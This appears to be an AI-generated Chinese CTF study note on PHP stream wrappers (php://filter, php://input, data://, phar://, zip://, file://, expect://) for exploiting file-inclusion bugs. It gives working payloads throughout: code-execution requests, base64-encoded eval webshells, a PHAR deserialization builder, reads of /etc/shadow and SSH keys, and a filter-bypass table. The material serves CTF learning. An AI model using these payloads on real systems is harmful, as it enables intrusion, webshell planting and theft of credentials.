---
AIGC:
  ContentProducer: '001191110102MAD55U9H0F10002'
  ContentPropagator: '001191110102MAD55U9H0F10002'
  Label: '1'
  ProduceID: 'ece78d12-fce3-407f-9c64-6e7b0e9a7bd8'
  PropagateID: 'ece78d12-fce3-407f-9c64-6e7b0e9a7bd8'
  ReservedCode1: '982f7974-96c3-40be-ac08-def2732468d9'
  ReservedCode2: '982f7974-96c3-40be-ac08-def2732468d9'
---

# CTF Web 知识点补充 — PHP 伪协议（PHP Stream Wrappers）

## 1. 概述

PHP 伪协议（PHP Stream Wrappers）是 PHP 提供的一组流协议封装器，
允许通过 URL 形式的路径访问各种数据源。
在 CTF 中，伪协议常用于文件包含漏洞（LFI）场景，
实现源码读取、代码执行、任意文件读取等目的。

所有伪协议以 `协议名://` 格式开头，可直接用于文件操作函数：
`include()`, `require()`, `file_get_contents()`, `fopen()`, `highlight_file()` 等。

### 伪协议总览

| 协议 | 用途 | 需要的条件 | CTF 常见场景 |
|------|------|-----------|-------------|
| `php://filter` | 读取源码 / 编码转换 | 无特殊要求 | 源码泄露 |
| `php://input` | 读取 POST 原始数据 | allow_url_include=On | 代码执行 |
| `data://` | 内联数据读取 | allow_url_include=On | 代码执行 |
| `file://` | 绝对路径文件访问 | 无特殊要求 | 任意文件读取 |
| `phar://` | PHAR 归档文件访问 | phar.readonly=Off（写），读取默认可用 | 反序列化利用 |
| `zip://` | ZIP 压缩包内文件访问 | 无特殊要求 | 绕过后缀检查 |
| `compress.zlib://` | gzip 解压读取 | zlib 扩展 | 绕过 WAF |
| `expect://` | 命令执行 | expect 扩展 | 命令执行 |
| `glob://` | 文件名通配匹配 | 无特殊要求 | 文件枚举 |
| `shm://` / `shmop://` | 共享内存访问 | shmop 扩展 | 特殊场景 |

---

## 2. php://filter —— 最常用的伪协议

### 2.1 基本原理

`php://filter` 是一个元封装器，对数据流应用过滤器操作。
本意是在读写文件时对内容进行编码/解码/过滤，
但在 CTF 中主要用于**读取 PHP 源码**。

**为什么需要它？**
直接 `include('flag.php')` 时，PHP 会执行 flag.php 中的代码，
不会显示源码。而用 `php://filter` 对文件内容进行 Base64 编码后输出，
PHP 代码不会被解析，而是以 Base64 文本形式返回。

### 2.2 基本语法

```
php://filter/[read|write]=过滤器1|过滤器2/resource=文件路径
```

- `read` 读取时应用过滤器
- `write` 写入时应用过滤器
- `resource` 目标文件路径
- 多个过滤器用 `|` 管道符串联

### 2.3 常用过滤器

#### 字符串过滤器

| 过滤器 | 作用 | CTF 场景 |
|--------|------|---------|
| `string.rot13` | ROT13 编码 | 绕过关键字过滤 |
| `string.toupper` | 转大写 | — |
| `string.tolower` | 转小写 | — |
| `string.strip_tags` | 去除 HTML/PHP 标签 | 去除 PHP 代码标签 |

#### 转换过滤器（最常用）

| 过滤器 | 作用 | CTF 场景 |
|--------|------|---------|
| `convert.base64-encode` | Base64 编码 | **读取 PHP 源码**（最常用） |
| `convert.base64-decode` | Base64 解码 | 解码数据 |
| `convert.iconv.*` | 字符集转换 | 绕过 WAF / 构造特定字节 |

#### 其他过滤器

| 过滤器 | 作用 |
|--------|------|
| `convert.quoted-printable-encode` | QP 编码 |
| `zlib.deflate` | gzip 压缩 |
| `zlib.inflate` | gzip 解压 |
| `mcrypt.*` / `mdecrypt.*` | 加密/解密（需扩展） |

### 2.4 经典利用

#### 场景一：读取 PHP 源码

```
GET /?file=php://filter/read=convert.base64-encode/resource=flag.php
```

返回 Base64 编码的 flag.php 源码，解码后得到原始 PHP 代码：

```bash
echo "PD9waHAgJGZsYWcgPSAiZmxhZ3s..." | base64 -d
# 输出: <?php $flag = "flag{...}";
```

#### 场景二：绕过后缀限制

当题目限制了 `resource` 的后缀（如必须以 `.php` 结尾）：

```
php://filter/read=convert.base64-encode/resource=flag.php
```

由于 filter 本身不改变文件后缀，通常不受后缀检查影响。
但如果检查的是参数整体：

```
# 利用转换过滤器链绕过
php://filter/read=convert.iconv.utf-8.utf-16/resource=flag.php
```

#### 场景三：利用 string.rot13 读取源码

当 Base64 被过滤时：

```
php://filter/read=string.rot13/resource=flag.php
```

返回 ROT13 编码的源码，`<?php` 变成 `<?cuc`，手动或脚本还原即可。

#### 场景四：convert.iconv 构造特定内容

`convert.iconv` 可以在不同字符集间转换，
在高级 CTF 题目中可用于**构造任意字节序列**：

```
# 将 UTF-8 转 UTF-16，产生不可见字符，可能绕过内容检查
php://filter/read=convert.iconv.utf-8.utf-16/resource=flag.php

# 利用 iconv 链式转换构造 webshell 内容（高级技巧）
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|...|resource=php://temp
```

#### 场景五：绕过 deathexit（exit 绕过）

某些题目会在文件开头写入 `<?php exit; ?>`，
导致包含的文件直接退出无法执行后续代码。
利用 `php://filter` 的 base64 解码特性绕过：

```
# 文件内容: <?php exit; ?>PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==
# 利用 base64 解码，PHP引擎会忽略非法字符
php://filter/read=convert.base64-decode/resource=shell.php
```

原理：Base64 解码时只处理 `[A-Za-z0-9+/=]` 字符，
`<?php exit; ?>` 中的 `<`, `>`, `;`, ` ` 等会被忽略，
剩余的 `phpexit` 会被当作 Base64 数据解码（7字节，不构成完整分组，不影响后续解码）。

精心构造上传文件内容，使得解码后恰好得到完整的 PHP 代码。

---

## 3. php://input —— 读取 POST 原始流

### 3.1 基本原理

`php://input` 是一个只读流，可以读取 POST 请求的原始数据。
当它作为文件包含路径时，会将 POST body 内容作为 PHP 代码执行。

### 3.2 利用条件

| 条件 | 说明 |
|------|------|
| `allow_url_include = On` | PHP 配置必须开启远程/流包含 |
| `enctype` | 不能是 `multipart/form-data`（会消耗 input 流） |
| PHP 版本 | < 5.6 可直接用于 include; >= 7.0 部分场景受限 |

### 3.3 基本利用

**请求构造**：
```
GET /?file=php://input HTTP/1.1
Content-Type: application/x-www-form-urlencoded

<?php system('cat /flag'); ?>
```

服务器端代码：
```php
<?php
include($_GET['file']);
// 当 file=php://input 时，POST body 的内容被当作 PHP 执行
?>
```

### 3.4 高级技巧

**利用 file_put_contents 写文件**：
```php
<?php file_put_contents('shell.php','<?php eval($_POST["cmd"]);?>');?>
```

**利用 PHP 代码读取目录结构**：
```php
<?php var_dump(scandir('/var/www/html/'));?>
```

---

## 4. data:// —— 内联数据协议

### 4.1 基本原理

`data://` 伪协议允许将数据直接嵌入 URL 中，
当用于文件包含时，可将内联数据作为 PHP 代码执行。

### 4.2 利用条件

| 条件 | 说明 |
|------|------|
| `allow_url_include = On` | 需开启流包含 |
| PHP 版本 | >= 5.2 |

### 4.3 基本语法

```
data://[<mediatype>][;base64],<data>
```

### 4.4 利用方式

**方式一：明文内联 PHP 代码**
```
GET /?file=data://text/plain,<?php system('id');?>
```

URL 编码后：
```
GET /?file=data://text/plain,%3C%3Fphp%20system%28%27id%27%29%3B%3F%3E
```

**方式二：Base64 编码绕过**
```python
# 原始代码: <?php system('cat /flag');?>
# Base64: PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTs/Pg==
```
```
GET /?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTs/Pg==
```

Base64 编码有效绕过对 `<?php`, `system` 等关键字的过滤。

**方式三：利用 media type 绕过**
```
GET /?file=data://text/plain;charset=unicode,<?php system('id');?>
```

### 4.5 data:// 与 php://input 对比

| 对比项 | data:// | php://input |
|--------|---------|-------------|
| 数据位置 | URL 参数中 | POST body 中 |
| URL 长度限制 | 受 URL 长度限制（通常 2KB-8KB） | 无限制 |
| 绕过能力 | 可 Base64 编码绕过关键字检查 | 明文传输，易被 WAF 检测 |
| 依赖条件 | allow_url_include=On | allow_url_include=On |
| CTF 优先级 | 优先（简洁、可编码） | 备选（适合大 payload） |

---

## 5. phar:// —— PHAR 归档协议

### 5.1 基本原理

`phar://` 用于访问 PHAR（PHP Archive）归档文件中的内容。
PHAR 文件有自带的 manifest（清单），其中存储的元数据在反序列化时会被自动解析，
因此 `phar://` 是 CTF 中**反序列化利用的重要入口**。

### 5.2 文件结构

```
PHAR 文件结构:
┌──────────────────┐
│   stub (存根)     │  最小 PHP 代码: <?php __HALT_COMPILER(); ?>
├──────────────────┤
│   manifest        │  文件清单 + 元数据（metadata，会被反序列化!）
├──────────────────┤
│   文件内容        │  压缩的文件数据
├──────────────────┤
│   签名（可选）     │  MD5/SHA1/SHA256/OpenSSL
└──────────────────┘
```

### 5.3 反序列化利用

当任何文件操作函数访问 `phar://` 协议时，
PHAR 文件的 manifest 中的 metadata 会被自动反序列化。

**受影响的函数（不限于文件操作）**：

| 类别 | 函数 |
|------|------|
| 文件操作 | `file_exists`, `is_dir`, `is_file`, `file_get_contents`, `fopen`, `filesize`, `fileatime` 等 |
| 目录操作 | `opendir`, `readdir`, `scandir`, `mkdir`, `rmdir` |
| 图像操作 | `getimagesize`, `exif_read_data`, `imagecreatefrom***` |
| 其他 | `class_exists`, `get_class_methods`, `SplFileInfo` 等 |

**利用流程**：

1. 构造恶意 PHAR 文件（metadata 中放入反序列化利用链对象）：
```php
<?php
class TargetClass {
    public $cmd = "system('cat /flag');";
}
$phar = new Phar('evil.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'test');
$phar->setMetadata(new TargetClass());
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
?>
```

2. 将 evil.phar 改名为 evil.jpg 绕过后缀检查

3. 触发反序列化（题目中存在 `file_exists($_GET['file'])` 等）：
```
GET /?file=phar://uploads/evil.jpg
```

### 5.4 phar 绕过后缀检查

- PHAR 文件可改名为任意后缀（.jpg / .png / .gif / .txt）
- 只要内容是合法 PHAR 格式，`phar://` 协议就能解析
- 可配合 GIF89a 文件头绕过内容检查（stub 部分可放图片头）

---

## 6. zip:// / bzip2:// / zlib:// —— 压缩流协议

### 6.1 zip://

**基本原理**：直接访问 ZIP 压缩包内的文件，不需要解压。

```
zip://压缩包路径#压缩包内文件名
```

**CTF 场景**：绕过后缀检查

```
# 上传 shell.zip 内含 shell.php
# 服务器只检查 .zip 后缀，不检查内容
GET /?file=zip://uploads/shell.zip#shell.php
```

注意：`#` 需要 URL 编码为 `%23`：
```
GET /?file=zip://uploads/shell.zip%23shell.php
```

### 6.2 compress.zlib:// / compress.bzip2://

```
# gzip 压缩文件
compress.zlib://file.gz

# bzip2 压缩文件
compress.bzip2://file.bz2
```

可用于读取 gzip/bzip2 压缩的文件内容，
也可用于绕过内容检查（压缩后内容不包含原始关键字）。

---

## 7. file:// —— 绝对路径文件访问

### 7.1 基本原理

`file://` 是 PHP 默认的文件访问协议，用于访问本地文件系统。
实际使用中，直接写文件路径（如 `/etc/passwd`）等效于 `file:///etc/passwd`。

### 7.2 利用方式

```
# 读取系统文件
GET /?file=/etc/passwd
GET /?file=file:///etc/passwd

# 读取 Web 目录
GET /?file=/var/www/html/config.php

# 读取 SSH 密钥
GET /?file=/home/user/.ssh/id_rsa

# 读取 Apache 配置
GET /?file=/etc/apache2/apache2.conf
GET /?file=/etc/nginx/nginx.conf

# 读取 PHP 配置
GET /?file=/usr/local/etc/php/php.ini
```

### 7.3 常见敏感文件路径

| 路径 | 内容 |
|------|------|
| `/etc/passwd` | 系统用户列表 |
| `/etc/shadow` | 用户密码哈希（需 root 权限） |
| `/etc/hosts` | 主机映射 |
| `/proc/self/environ` | 当前进程环境变量 |
| `/proc/self/cmdline` | 当前进程启动命令 |
| `/var/log/apache2/access.log` | Apache 访问日志 |
| `/var/log/nginx/access.log` | Nginx 访问日志 |
| `/tmp/sess_XXXX` | Session 文件 |
| `/flag` / `/flag.txt` / `/home/flag` | CTF 常见 flag 位置 |

---

## 8. expect:// —— 命令执行协议

### 8.1 基本原理

`expect://` 协议需安装 PHP 的 expect 扩展（通常默认未安装）。
开启后可直接执行系统命令。

### 8.2 利用方式

```
GET /?file=expect://id
GET /?file=expect://cat /flag
```

### 8.3 利用条件

- PHP 安装了 expect 扩展（`php -m | grep expect`）
- `allow_url_include = On`

由于 expect 扩展极少默认安装，CTF 中较少遇到此场景。

---

## 9. CTF 实战速查表

### 9.1 快速决策树

```
┌───────────────────────────────────────────────────┐
│        PHP 伪协议利用 — 快速决策树                 │
├───────────────────────────────────────────────────┤
│                                                   │
│  目标：读取源码？                                   │
│    └── php://filter/read=convert.base64-encode    │
│        /resource=目标文件                          │
│                                                   │
│  目标：执行代码？                                   │
│    ├── allow_url_include=On？                      │
│    │   ├── data://text/plain;base64,PD9waHAg...  │
│    │   └── php://input + POST body=<?php ...?>   │
│    │                                               │
│    └── allow_url_include=Off？                     │
│        ├── 可上传文件 → include 上传文件            │
│        ├── phar:// + 反序列化链                    │
│        └── php://filter + exit绕过                │
│                                                   │
│  目标：读取任意文件？                                │
│    └── file:///绝对路径 或 直接写绝对路径          │
│                                                   │
│  目标：绕过后缀检查？                               │
│    ├── zip://上传的.zip%23shell.php               │
│    ├── phar://上传的.jpg（反序列化）              │
│    └── compress.zlib://上传的.gz                  │
│                                                   │
└───────────────────────────────────────────────────┘
```

### 9.2 常见过滤绕过对照表

| 过滤内容 | 绕过方式 |
|---------|---------|
| 过滤 `php://` | 大小写：`PHP://filter`；或用 `Php://` |
| 过滤 `php://filter` | 使用其他过滤器：`string.rot13` 替代 `base64` |
| 过滤 `base64` | `convert.iconv.utf-8.utf-16` 或 `string.rot13` |
| 过滤 `resource=` | 无直接绕过，需寻找其他协议 |
| 过滤 `data://` | `data://text/plain;base64,` 或 `php://input` 替代 |
| 过滤 `//` | `php:` (部分版本兼容) |
| 过滤 `..` 路径穿越 | 使用绝对路径 / file:// 协议 |
| 过滤 `flag` 关键字 | php://filter 读源码后 Base64 解码，不含明文 flag |
| 过滤 `<` 和 `>` | data:// + Base64 编码绕过 |
| 过滤 `php` 标签 | `<?=短标签` + `short_open_tag=On` |

### 9.3 allow_url_include 状态判断

| 方法 | 操作 | 判断 |
|------|------|------|
| phpinfo() | 查找 `allow_url_include` | On/Off |
| 尝试 data:// | `?file=data://text/plain,<?php phpinfo();?>` | 执行=On |
| 尝试 php://input | POST `<?php phpinfo();?>` | 执行=On |
| 报错信息 | 包含失败时的错误级别 | Warning=On, 无错=Off |

### 9.4 伪协议组合利用

**php://filter + 文件写入 + 后门**：
```
# 利用 php://filter/write 写入文件并自动解码
?file=php://filter/write=convert.base64-decode/resource=shell.php
POST: PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==
```

**phar:// + zip:// 组合**：
```
# PHAR 文件也可作为 ZIP 访问
?file=zip://evil.phar%23shell.php
?file=phar://evil.zip/shell.php
```

---

## 10. 相关 PHP 配置项总结

| 配置项 | 默认值 | 影响 |
|--------|--------|------|
| `allow_url_fopen` | On | 允许 URL 形式的文件访问 |
| `allow_url_include` | Off | 允许 URL 形式的 include/require |
| `phar.readonly` | On | 限制 PHAR 写入（读取不受限） |
| `open_basedir` | 空 | 限制文件访问目录范围 |
| `disable_functions` | 空 | 禁用的函数列表 |
| `short_open_tag` | On | 短标签 `<?` 支持 |

---

## 11. 总结

| 伪协议 | 首要用途 | 关键条件 |
|--------|---------|---------|
| `php://filter` | 读取源码 / 编码转换 / exit 绕过 | 无特殊要求 |
| `php://input` | 代码执行（POST body） | allow_url_include=On |
| `data://` | 代码执行（内联数据） | allow_url_include=On |
| `phar://` | 反序列化利用 | 文件操作函数触发 |
| `zip://` | 绕过后缀检查访问压缩包内文件 | 无特殊要求 |
| `file://` | 任意文件读取 | 无特殊要求 |
| `expect://` | 命令执行 | expect 扩展 + allow_url_include=On |

### 实战优先级

1. **首先尝试 `php://filter`** — 读取源码了解程序逻辑
2. **判断 `allow_url_include`** — 决定是否能用 data:// 或 php://input
3. **判断是否有文件操作函数** — 考虑 phar:// 反序列化
4. **判断是否有上传功能** — 考虑 zip:// 或 .user.ini + 上传组合
5. **尝试 file:// 或绝对路径** — 直接读取敏感文件

> AI生成